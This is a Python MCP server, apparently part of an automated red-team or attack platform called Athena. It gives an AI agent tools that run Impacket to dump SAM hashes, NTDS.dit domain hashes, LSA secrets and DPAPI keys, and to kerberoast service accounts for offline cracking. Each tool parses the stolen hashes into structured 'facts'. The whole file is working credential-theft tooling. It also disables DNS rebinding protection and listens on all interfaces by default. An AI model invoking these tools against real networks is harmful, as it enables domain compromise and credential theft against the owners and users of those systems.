"""credential-dumper MCP Server for Athena.

Impacket-based SAM/NTDS/DCSync/Kerberoasting credential extraction.
Returns JSON with {"facts": [{"trait": ..., "value": ...}]}
to integrate with Athena's fact collection pipeline.
"""

import asyncio
import json
import re

from mcp.server.fastmcp import FastMCP
from mcp.server.transport_security import TransportSecuritySettings

# Allow Docker internal network hostnames (mcp-xxx, etc.)
_security = TransportSecuritySettings(
    enable_dns_rebinding_protection=False,
)

mcp = FastMCP("athena-credential-dumper", transport_security=_security)


async def _run_command(cmd: list[str], timeout: int = 120) -> tuple[str, str, int]:
    """Run subprocess asynchronously with timeout."""
    proc = await asyncio.create_subprocess_exec(
        *cmd,
        stdout=asyncio.subprocess.PIPE,
        stderr=asyncio.subprocess.PIPE,
    )
    try:
        stdout, stderr = await asyncio.wait_for(proc.communicate(), timeout=timeout)
    except asyncio.TimeoutError:
        proc.kill()
        return "", "Command timed out", -1
    return (
        stdout.decode(errors="replace"),
        stderr.decode(errors="replace"),
        proc.returncode or 0,
    )


def _build_target_string(
    username: str, password: str, target: str, domain: str = "",
) -> str:
    """Build the 'domain/user:password@target' string for Impacket."""
    if domain:
        return f"{domain}/{username}:{password}@{target}"
    return f"{username}:{password}@{target}"


# Regex for hash lines: user:rid:lmhash:nthash:::
_HASH_LINE_RE = re.compile(
    r"^([^:]+):(\d+):([a-fA-F0-9]{32}):([a-fA-F0-9]{32}):::",
)

# Regex for Kerberos hash lines ($krb5tgs$...)
_KERBEROS_HASH_RE = re.compile(r"\$krb5tgs\$.*")

# Regex for SPN account lines from GetUserSPNs
_SPN_ACCOUNT_RE = re.compile(
    r"^(\S+)\s+.*\$\s+\d{4}-",  # "svc_account  ... $ 2024-..."
)


@mcp.tool()
async def dump_sam_hashes(
    target: str,
    username: str,
    password: str,
    domain: str = "",
) -> str:
    """Dump SAM hashes from target using Impacket secretsdump.

    Args:
        target: IP or hostname
        username: Admin username
        password: Admin password
        domain: Windows domain (optional)

    Returns:
        JSON with facts: credential.hash (NTLM hashes)
    """
    facts: list[dict[str, str]] = []

    try:
        target_str = _build_target_string(username, password, target, domain)
        cmd = ["impacket-secretsdump", target_str, "-sam"]

        stdout, stderr, rc = await _run_command(cmd)
        combined = stdout + stderr

        for line in combined.splitlines():
            match = _HASH_LINE_RE.match(line.strip())
            if match:
                user = match.group(1)
                nt_hash = match.group(4)
                facts.append({
                    "trait": "credential.hash",
                    "value": f"{user}:{nt_hash}",
                })

        return json.dumps({
            "facts": facts,
            "raw_output": combined[:4000],
        })

    except Exception as exc:
        return json.dumps({
            "facts": [],
            "raw_output": "",
            "error": {"type": type(exc).__name__, "message": str(exc)},
        })


@mcp.tool()
async def dump_ntds(
    target: str,
    username: str,
    password: str,
    domain: str,
) -> str:
    """Dump NTDS.dit from Domain Controller using Impacket.

    Args:
        target: DC IP or hostname
        username: Domain admin username
        password: Domain admin password
        domain: Windows domain name

    Returns:
        JSON with facts: credential.hash, credential.domain_user
    """
    facts: list[dict[str, str]] = []

    try:
        target_str = _build_target_string(username, password, target, domain)
        cmd = ["impacket-secretsdump", target_str, "-just-dc"]

        stdout, stderr, rc = await _run_command(cmd, timeout=300)
        combined = stdout + stderr

        for line in combined.splitlines():
            match = _HASH_LINE_RE.match(line.strip())
            if match:
                user = match.group(1)
                nt_hash = match.group(4)
                facts.append({
                    "trait": "credential.hash",
                    "value": f"{user}:{nt_hash}",
                })
                facts.append({
                    "trait": "credential.domain_user",
                    "value": user,
                })

        return json.dumps({
            "facts": facts,
            "raw_output": combined[:4000],
        })

    except Exception as exc:
        return json.dumps({
            "facts": [],
            "raw_output": "",
            "error": {"type": type(exc).__name__, "message": str(exc)},
        })


@mcp.tool()
async def kerberoast(
    target: str,
    username: str,
    password: str,
    domain: str,
) -> str:
    """Kerberoasting -- extract SPN service ticket hashes for offline cracking.

    Args:
        target: DC IP or hostname
        username: Domain username (any valid user)
        password: Domain password
        domain: Windows domain name

    Returns:
        JSON with facts: credential.kerberos_hash, credential.spn_account
    """
    facts: list[dict[str, str]] = []

    try:
        cmd = [
            "impacket-GetUserSPNs",
            f"{domain}/{username}:{password}",
            "-dc-ip", target,
            "-request",
        ]

        stdout, stderr, rc = await _run_command(cmd)
        combined = stdout + stderr

        current_spn: str | None = None
        for line in combined.splitlines():
            stripped = line.strip()

            # Detect SPN account names from the table output
            # Format: "ServiceAccountName  ... MemberOf  ..."
            if stripped and not stripped.startswith("$") and not stripped.startswith("-"):
                parts = stripped.split()
                if len(parts) >= 2 and not stripped.startswith("Impacket"):
                    # Heuristic: first column is the SPN account name
                    candidate = parts[0]
                    if (
                        candidate
                        and not candidate.startswith("[")
                        and candidate not in {"ServicePrincipalName", "Name", "MemberOf"}
                    ):
                        current_spn = candidate

            # Detect Kerberos hash
            krb_match = _KERBEROS_HASH_RE.search(stripped)
            if krb_match:
                hash_value = krb_match.group(0)
                # Truncate hash for fact storage (full hash in raw_output)
                facts.append({
                    "trait": "credential.kerberos_hash",
                    "value": hash_value[:120] + "..." if len(hash_value) > 120 else hash_value,
                })
                if current_spn:
                    facts.append({
                        "trait": "credential.spn_account",
                        "value": current_spn,
                    })
                    current_spn = None

        return json.dumps({
            "facts": facts,
            "raw_output": combined[:4000],
        })

    except Exception as exc:
        return json.dumps({
            "facts": [],
            "raw_output": "",
            "error": {"type": type(exc).__name__, "message": str(exc)},
        })


@mcp.tool()
async def dump_lsa_secrets(
    target: str,
    username: str,
    password: str,
    domain: str = "",
) -> str:
    """Dump LSA Secrets (cached credentials, DPAPI keys).

    Args:
        target: IP or hostname
        username: Admin username
        password: Admin password
        domain: Windows domain (optional)

    Returns:
        JSON with facts: credential.cached, credential.dpapi_key
    """
    facts: list[dict[str, str]] = []

    try:
        target_str = _build_target_string(username, password, target, domain)
        cmd = ["impacket-secretsdump", target_str, "-lsa"]

        stdout, stderr, rc = await _run_command(cmd)
        combined = stdout + stderr

        in_lsa_section = False
        in_dpapi_section = False

        for line in combined.splitlines():
            stripped = line.strip()

            # Track sections
            if "LSA Secrets" in stripped:
                in_lsa_section = True
                in_dpapi_section = False
                continue
            if "DPAPI" in stripped:
                in_dpapi_section = True
                in_lsa_section = False
                continue
            if stripped.startswith("[*]") and in_lsa_section:
                # New section marker — might end LSA
                if "LSA" not in stripped:
                    in_lsa_section = False

            # Extract cached domain credentials
            if in_lsa_section and stripped and not stripped.startswith("["):
                # Cached credentials typically show as domain\user:password or hashes
                if ":" in stripped and len(stripped) > 3:
                    facts.append({
                        "trait": "credential.cached",
                        "value": stripped[:200],
                    })

            # Extract DPAPI keys
            if in_dpapi_section and stripped and not stripped.startswith("["):
                if re.match(r"^[a-fA-F0-9]{32,}$", stripped.replace(" ", "")):
                    facts.append({
                        "trait": "credential.dpapi_key",
                        "value": stripped[:200],
                    })

        # Also pick up any hash lines
        for line in combined.splitlines():
            match = _HASH_LINE_RE.match(line.strip())
            if match:
                user = match.group(1)
                nt_hash = match.group(4)
                facts.append({
                    "trait": "credential.cached",
                    "value": f"{user}:{nt_hash}",
                })

        return json.dumps({
            "facts": facts,
            "raw_output": combined[:4000],
        })

    except Exception as exc:
        return json.dumps({
            "facts": [],
            "raw_output": "",
            "error": {"type": type(exc).__name__, "message": str(exc)},
        })


if __name__ == "__main__":
    import argparse

    parser = argparse.ArgumentParser()
    parser.add_argument(
        "--transport",
        default="stdio",
        choices=["stdio", "sse", "streamable-http"],
    )
    parser.add_argument("--host", default="0.0.0.0")
    parser.add_argument("--port", type=int, default=8080)
    args = parser.parse_args()

    mcp.settings.host = args.host
    mcp.settings.port = args.port
    mcp.run(transport=args.transport)
